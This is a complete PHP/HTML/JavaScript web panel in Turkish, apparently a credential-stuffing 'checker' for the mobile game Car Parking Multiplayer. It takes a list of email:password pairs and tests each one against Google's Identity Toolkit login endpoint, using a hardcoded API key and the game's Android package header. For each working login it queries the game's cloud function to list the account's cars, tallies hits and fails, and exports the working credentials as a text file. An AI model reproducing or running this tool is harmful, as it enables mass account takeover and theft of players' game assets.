<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

// API İşlemleri
if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    function cpm_curl($url, $post = null, $headers = []) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }

    $loginUrl = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM";
    $loginData = json_encode(["email" => $user, "password" => $pass, "returnSecureToken" => true, "clientType" => "CLIENT_TYPE_ANDROID"]);
    $loginRes = cpm_curl($loginUrl, $loginData, ["Content-Type: application/json", "X-Android-Package: com.olzhas.carparking.multyplayer"]);
    $loginJson = json_decode($loginRes, true);

    if (isset($loginJson['localId'])) {
        $carUrl = "https://us-central1-cp-multiplayer.cloudfunctions.net/WSGetCarIDnStatusV2";
        $bazendiyomgidemya = cpm_curl($carUrl, json_encode(["data" => $loginJson['localId']]), ["Content-Type: application/json", "Authorization: Bearer " . $loginJson['idToken']]);
        
        preg_match_all('/\\\\?"([A-Z0-9_]{3,})\\\\?"/', $bazendiyomgidemya, $yaokardaönemlideğilceişte);
        $senşimdibenimyaptığımkodumincelionlanyarramınkafasıneanlarsınsenkoddan = [];
        if (!empty($yaokardaönemlideğilceişte[1])) {
            foreach ($yaokardaönemlideğilceişte[1] as $car) {
                if (!in_array($car, ["carGeneratedIDs", "data", "success"])) $senşimdibenimyaptığımkodumincelionlanyarramınkafasıneanlarsınsenkoddan[] = $car;
            }
        }
        $senşimdibenimyaptığımkodumincelionlanyarramınkafasıneanlarsınsenkoddan = array_unique($senşimdibenimyaptığımkodumincelionlanyarramınkafasıneanlarsınsenkoddan);

        echo json_encode([
            'status' => 'success',
            'user' => $user, 'pass' => $pass,
            'arabalar' => count($senşimdibenimyaptığımkodumincelionlanyarramınkafasıneanlarsınsenkoddan) > 0 ? implode(", ", $senşimdibenimyaptığımkodumincelionlanyarramınkafasıneanlarsınsenkoddan) : "ARABA YOK",
            'sayi' => count($senşimdibenimyaptığımkodumincelionlanyarramınkafasıneanlarsınsenkoddan)
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user, 'pass' => $pass]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CPM ULTRA PRO | EXPORT EDITION</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #030508; color: #e2e8f0; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .neon-blue { box-shadow: 0 0 15px rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.3); }
        .neon-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); }
        .neon-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); }
        .main-card { background: rgba(15, 18, 26, 0.9); backdrop-filter: blur(10px); border-radius: 16px; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.05); }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .animate-fade { animation: fadeInUp 0.5s ease forwards; }
        .btn-shimmer { position: relative; overflow: hidden; }
        .btn-shimmer::after { content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent); transform: rotate(45deg); transition: 0.6s; }
        .btn-shimmer:hover::after { left: 120%; }
        .input-area { background: #0a0c12; border: 1px solid #1f2937; border-radius: 12px; color: #60a5fa; font-family: 'Consolas', monospace; transition: 0.3s; width: 100%; outline: none; }
        .input-area:focus { border-color: #3b82f6; box-shadow: 0 0 10px rgba(59, 130, 246, 0.2); }
        .hit-box { background: linear-gradient(145deg, #0f121a, #0a0c12); border-left: 4px solid #10b981; border-radius: 12px; animation: fadeInUp 0.4s ease; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #030508; }
        ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: #3b82f6; }
    </style>
</head>
<body class="p-4 md:p-8">

    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-8 animate-fade">
        <div class="flex items-center gap-3">
            <div class="w-11 h-11 bg-blue-600 rounded-lg flex items-center justify-center shadow-lg shadow-blue-600/30">
                <i class="fas fa-bolt text-white text-xl"></i>
            </div>
            <h1 class="text-2xl font-black tracking-tighter italic leading-none" style="font-family: 'Syncopate', sans-serif;">
                CAR<span class="text-blue-500">Parking</span><span class="text-gray-600 text-xs ml-2 font-normal">v5.1</span>
            </h1>
        </div>
        <a href="index.php" class="bg-white/5 hover:bg-red-500 border border-white/10 px-5 py-2.5 rounded-xl text-xs font-black text-gray-300 hover:text-white transition-all uppercase tracking-widest">
            <i class="fas fa-power-off mr-2"></i> Geri Çıkış
        </a>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-5 mb-8 animate-fade">
        <div class="main-card p-6 neon-blue">
            <span class="text-gray-500 text-[10px] font-black uppercase tracking-widest mb-1.5 block">Kalan İşlem</span>
            <div class="text-4xl font-black tracking-tighter" id="kalan_val">BİTTİ</div>
        </div>
        <div class="main-card p-6 neon-green">
            <span class="text-green-500 text-[10px] font-black uppercase tracking-widest mb-1.5 block">Hit Sayısı</span>
            <div class="text-4xl font-black tracking-tighter text-green-500" id="hit_count">0</div>
        </div>
        <div class="main-card p-6 neon-red">
            <span class="text-red-500 text-[10px] font-black uppercase tracking-widest mb-1.5 block">Fail Sayısı</span>
            <div class="text-4xl font-black tracking-tighter text-red-500" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        
        <div class="lg:col-span-4 space-y-5 animate-fade">
            <div class="main-card p-6 shadow-xl border border-white/5">
                <div class="flex items-center gap-3 mb-4 border-b border-white/5 pb-3">
                    <i class="fas fa-database text-blue-500"></i>
                    <h2 class="text-lg font-black uppercase tracking-tighter">Hesap Havuzu</h2>
                </div>
                
                <textarea id="accs" class="input-area h-[220px] p-4 text-xs leading-relaxed" placeholder="mail:pass"></textarea>
                
                <button id="btn" onclick="startCheck()" class="btn-shimmer w-full mt-5 py-4 bg-blue-600 rounded-xl text-white font-black uppercase tracking-widest active:scale-[0.98] transition-all text-sm shadow-md shadow-blue-600/20">
                    Taramayı Başlat
                </button>
            </div>

            <div class="main-card p-7 h-32 overflow-y-auto border border-white/5 bg-black/50 font-mono text-[10px]" id="mini_log">
                <div class="text-gray-600 tracking-widest uppercase mb-1">Sistem Konsolu Hazır...</div>
            </div>
        </div>

        <div class="lg:col-span-8 animate-fade">
            <div class="flex justify-between items-end mb-4">
                <div>
                    <h2 class="text-xl font-black uppercase tracking-tighter">Yakalama Paneli</h2>
                </div>
                <button onclick="downloadHits()" class="btn-shimmer bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-xl text-xs font-black transition-all shadow-md shadow-green-600/10 uppercase tracking-widest flex items-center gap-2">
                    <i class="fas fa-file-export text-sm"></i> Hitleri İndir (.txt)
                </button>
            </div>

            <div class="main-card p-6 h-[660px] overflow-y-auto space-y-5 shadow-xl" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full text-gray-800 italic">
                    <i class="fas fa-satellite-dish text-7xl mb-5 opacity-10"></i>
                    <p class="font-black tracking-[0.4em] uppercase opacity-20 text-sm">Hesap Bekleniyor...</p>
                </div>
            </div>
        </div>

    </div>

    <script>
        let running = false;
        let hits = 0; let fails = 0;
        let hitResults = []; 

        async function startCheck() {
            const list = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
            if(!list.length) return alert("Liste girmedin!");

            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "SİSTEMİ DURDUR";
            btn.classList.replace('bg-blue-600', 'bg-red-600');
            document.getElementById('kalan_val').innerText = list.length;

            for(let line of list) {
                if(!running) break;
                const [u, p] = line.trim().split(':');
                const mini = document.getElementById('mini_log');
                mini.innerHTML += `<div class="py-1 text-gray-500 font-mono">>> ${u.substring(0,8)} taranıyor...</div>`;
                mini.scrollTop = mini.scrollHeight;

                try {
                    const fd = new FormData(); fd.append('user', u); fd.append('pass', p);
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();

                    if(res.status === 'success') {
                        hits++;
                        document.getElementById('hit_count').innerText = hits;

                        hitResults.push(`${res.user}:${res.pass} | Araç: ${res.sayi} | Envanter: ${res.arabalar}`);
                        addHit(res);
                    } else {
                        fails++;
                        document.getElementById('fail_count').innerText = fails;
                        mini.innerHTML += `<div class="py-1 text-red-500/50 font-bold">!! HATALI: ${u}</div>`;
                    }
                } catch(e) { }
            }
            running = false;
            btn.innerText = "TARAMAYI BAŞLAT";
            btn.classList.replace('bg-red-600', 'bg-blue-600');
            document.getElementById('kalan_val').innerText = "BİTTİ";
        }

        function addHit(res) {
            const log = document.getElementById('hitLog');
            if(hits === 1) log.innerHTML = '';
            
            const div = document.createElement('div');
            div.className = 'hit-box p-5 hover:translate-x-1 transition-all';
            div.innerHTML = `
                <div class="flex flex-wrap justify-between items-start gap-4 pb-4 mb-4 border-b border-white/5">
                    <div class="flex items-center gap-4">
                        <div class="w-12 h-12 bg-green-500/10 rounded-xl flex items-center justify-center border border-green-500/20">
                            <i class="fas fa-check text-green-500 text-xl"></i>
                        </div>
                        <div>
                            <div class="text-xs text-blue-400 font-bold mb-0.5">${res.user}</div>
                            <div class="text-xs font-black opacity-60">${res.pass}</div>
                        </div>
                    </div>
                    <div class="text-right">
                        <div class="text-[9px] text-gray-500 font-black uppercase mb-0.5 tracking-widest">Gevşek Araç</div>
                        <div class="text-2xl font-black text-green-500">${res.sayi}</div>
                    </div>
                </div>
                <div class="p-3 bg-black/40 rounded-lg border border-white/5 text-[10px] font-mono text-blue-300/80 leading-relaxed break-all italic">
                    <i class="fas fa-tags mr-2 text-blue-500/50"></i>${res.arabalar}
                </div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (hitResults.length === 0) return alert("Henüz indirilecek hit bulunamadı!");
            
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            const date = new Date().toISOString().slice(0, 10);
            
            a.href = url;
            a.download = `CPM_HITS_${date}.txt`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        }
    </script>
</body>
</html>